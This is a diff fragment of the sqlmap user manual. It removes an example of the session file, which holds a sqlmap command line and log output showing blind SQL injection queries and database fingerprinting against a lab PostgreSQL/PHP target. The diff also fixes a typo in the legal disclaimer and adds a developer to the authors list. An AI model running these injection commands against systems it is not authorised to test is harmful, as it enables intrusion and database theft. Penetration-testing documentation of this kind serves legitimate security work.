-[http://192.168.1.121:80/sqlmap/pgsql/get_int.php][GET][id=1][COALESCE(3, NULL)][3]
-[http://192.168.1.121:80/sqlmap/pgsql/get_int.php][GET][id=1][LENGTH('3')][1]
-[http://192.168.1.121:80/sqlmap/pgsql/get_int.php][GET][id=1][DBMS][PostgreSQL]
-[http://192.168.1.121:80/sqlmap/pgsql/get_int.php][GET][id=1][VERSION()][PostgreSQL 8.3.5 
-on i486-pc-
-</verb></tscreen>
-
-<p>
-As you can see, all queries performed and their output have been logged to
-the session file in real time while performing the injection.
-
-<p>
-The session file has a structure as follows:
-
-<tscreen><verb>
-[hh:mm:ss MM/DD/YY]
-[Target URL][Injection point][Parameters][Query or information name][Query output or value]
-</verb></tscreen>
-
-<p>
-Performing the same request now, sqlmap resumes all information already
-retrieved then calculates the query length, in the example
-<tt>VERSION()</tt>, and resumes the injection from the last character
-retrieved to the end of the query output.
-
-<tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" -b \
-  -v 1 -s "sqlmap.log"
-
-[...]
-[hh:mm:03] [INFO] resuming injection point 'GET' from session file
-[hh:mm:03] [INFO] resuming injection parameter 'id' from session file
-[hh:mm:03] [INFO] resuming injection type 'numeric' from session file
-[hh:mm:03] [INFO] resuming 0 number of parenthesis from session file
-[hh:mm:03] [INFO] resuming back-end DBMS 'PostgreSQL' from session file
-[hh:mm:03] [INFO] testing connection to the target url
-[hh:mm:03] [INFO] testing for parenthesis on injectable parameter
-[hh:mm:03] [INFO] retrieving the length of query output
-[hh:mm:03] [INFO] query: LENGTH(VERSION())
-[hh:mm:03] [INFO] retrieved: 98
-[hh:mm:03] [INFO] resumed from file 'sqlmap.log': PostgreSQL 8.3.5 on i486-pc-...
-[hh:mm:03] [INFO] retrieving pending 70 query output characters
-[hh:mm:03] [INFO] query: SUBSTR((VERSION())::text, 29, 98)
-[hh:mm:03] [INFO] retrieved: linux-gnu, compiled by GCC gcc-4.3.real 
-(Ubuntu 4.3.2-1ubuntu11) 4.3.2
-web server operating system: Linux Ubuntu 8.10 (Intrepid Ibex)
-web application technology: PHP 5.2.6, Apache 2.2.9
-back-end DBMS operating system: Linux Ubuntu 8.10 (Intrepid Ibex)
-back-end DBMS: PostgreSQL
-
-[hh:mm:07] [INFO] fetching banner
-banner:    'PostgreSQL 8.3.5 on i486-pc-linux-gnu, compiled by GCC gcc-4.3.real 
-(Ubuntu 4.3.2-1ubuntu11) 4.3.2'
-</verb></tscreen>
 
 
 <sect2>Save options on a configuration INI file
@@ -5344,17 +5491,19 @@ FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 details.
 
 <p>
-Whatever you do with this tool is uniquely your responsability. If you are
+Whatever you do with this tool is uniquely your responsibility. If you are
 not authorized to punch holes in the network you are attacking be aware
 that such action might get you in trouble with a lot of law enforcement
 agencies.
 
 
-<sect>Author
+<sect>Authors
 
 <p>
 <htmlurl url="mailto:bernardo.damele@gmail.com" name="Bernardo Damele A. G."> (inquis) - Lead developer.
 PGP Key ID: <htmlurl url="http://pgp.mit.edu:11371/pks/lookup?op=get&amp;search=0x05F5A30F" name="0x05F5A30F">
 
+<htmlurl url="mailto:miroslav.stampar@gmail.com" name="Miroslav Stampar"> (stamparm) - Developer.
+PGP Key ID: <htmlurl url="http://pgp.mit.edu:11371/pks/lookup?op=get&amp;search=0xB5397B1B" name="0xB5397B1B">
 
 </article>
